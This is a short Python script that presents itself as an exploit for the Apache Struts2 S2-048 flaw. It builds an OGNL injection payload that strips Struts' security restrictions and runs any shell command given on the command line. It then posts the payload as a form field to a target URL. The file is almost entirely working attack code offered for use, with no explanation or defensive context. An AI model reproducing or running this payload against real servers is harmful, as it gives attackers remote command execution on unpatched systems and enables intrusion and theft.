#!/usr/bin/python
# -*- coding: utf-8 -*-
# by k

import requests


def exploit(url, cmd):
    print("[+] command: %s" % cmd)

    payload = "%{"
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(@java.lang.Runtime@getRuntime().exec('%s'))" % cmd
    payload += "}"

    data = {
        "name": payload,
        "age": 20,
        "__checkbox_bustedBefore": "true",
        "description": 1
    }

    headers = {
        'Referer': 'http://127.0.0.1:8080/2.3.15.1-showcase/integration/editGangster'
    }
    requests.post(url, data=data, headers=headers)


if __name__ == '__main__':
    import sys

    if len(sys.argv) != 3:
        print("python %s <url> <cmd>" % sys.argv[0])
        sys.exit(0)

    print('[*] exploit Apache Struts2 S2-048')
    url = sys.argv[1]
    cmd = sys.argv[2]

    exploit(url, cmd)

